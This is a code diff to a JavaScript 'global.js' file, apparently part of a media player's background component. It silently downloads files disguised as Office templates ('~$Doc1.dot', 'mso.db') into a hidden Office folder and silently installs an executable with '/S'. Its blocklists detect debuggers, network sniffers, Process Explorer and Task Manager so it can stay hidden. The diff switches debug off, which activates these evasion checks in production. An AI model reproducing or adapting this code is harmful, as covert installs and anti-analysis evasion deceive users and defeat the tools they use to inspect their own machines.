@@ -1,6 +1,6 @@
 trace("*----global.js----")
 __interrupted
-var __DEBUG = 1;
+var __DEBUG = 0;
 var __IsSupportOpencl = 0;
 var __external = external;
 var __windows = windows;
@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"A3371F591928F59DE6654A0F8228BBE9" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"4908BB66F457F1452E9CA6543113CBF2" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -35,7 +35,7 @@ if(__DEBUG)
 	var __idletime=1000*15
 else if(__IsSupportOpencl)
 	var __idletime=1000*30
-var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"B7A08DA40827CED0323C491B35CF7456" }
+var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"267B575DC6493B921333F5785DC236CE" }
 var __installReadys = [
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
 							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
@@ -383,12 +383,15 @@ function filter_eXclusiveRuning.prototype.run(pipe){
 function filter_eXclusiveRuning.prototype.checkWindows(){
 	var blacklist=["Microsoft Visual", "HTTP Analyzer", "WinDBG", "OllyDebug",		
 		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","Spy", 
-		"Process Explorer", "File Monitor", "Registry Monitor","Wireshark","OllyICE","OllyDBG",
+		 "File Monitor", "Registry Monitor","Wireshark","OllyICE","OllyDBG",
 		" - Sysinternals:"];
 	if(!__DEBUG){
 		blacklist.push("DebugView")
-		blacklist.push("任务管理器")		
+		blacklist.push("任务管理器")
+		blacklist.push("Process Explorer")
 	}
+	if(__DEBUG)
+		blacklist = [];
 	var titile
 	var ret = __windows.EnumWindows(function(hwnd, text){
 		for(var index in blacklist){
@@ -404,14 +407,17 @@ function filter_eXclusiveRuning.prototype.checkWindows(){
 }
 function filter_eXclusiveRuning.prototype.checkProcesses(){
 	var blacklist=["wireshark", "fiddler", "httpanalyzer", "smsniff", 
-					"filemon", "regmon", "procmon", "windbg", "procexp","cv.exe",
+					"filemon", "regmon", "procmon", "windbg", "cv.exe",
 					"ollydbg", "softice", "mzurlspy","devenv","msdev","spy","ollyice","Wireshark","dan",
 					"depends"];
 	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
 	if(!__DEBUG){
 		blacklist.push("dbgv")
 		blacklist.push("taskmgr")
+		blacklist.push("procexp")
 	}
+	if(__DEBUG)
+		blacklist = [];
 	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
 	for (var index in blacklist){
 		var name = blacklist[index];
